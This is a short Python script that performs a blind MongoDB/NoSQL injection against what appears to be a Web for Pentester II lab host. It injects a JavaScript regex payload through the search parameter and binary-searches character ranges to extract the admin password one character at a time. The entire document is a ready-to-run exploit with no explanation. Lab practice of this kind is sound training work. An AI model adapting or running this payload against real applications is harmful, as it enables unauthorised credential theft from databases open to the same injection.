import string
import requests
from bs4 import BeautifulSoup
from urllib.parse import quote


validPass = ""

def main():
    global validPass

    #alphaNumberic contains [0-9A-Za-z]
    alphaNumeric = "0123456789" + string.ascii_uppercase + string.ascii_lowercase

    while True:
        isValid = binarySearch(alphaNumeric)
        if isValid is None:
            break
        else:
            validPass += isValid
    print("Password: ", validPass)

def binarySearch(String):
    if len(String) == 1:
        return String

    midpoint = len(String)//2

    if blindInject(String[:midpoint]):
        print(String[:midpoint], "Match")
        return binarySearch(String[:midpoint])
    elif blindInject(String[midpoint:]):
        print(String[:midpoint], "Not Match")
        print(String[midpoint:], "Match")
        return binarySearch(String[midpoint:])

def blindInject(charRange):
    params = quote("'&& this.password.match(/^"+validPass+"["+charRange+"].*/)//")
    response = requests.get("http://wfp2.oregonctf.org/mongodb/example2?search=admin"+params)
    bsObj = BeautifulSoup(response.text, "html.parser")

    isValid = bsObj.find("a", {"href":"?search=admin"})
    return True if isValid else False

if __name__ == "__main__":
    main()

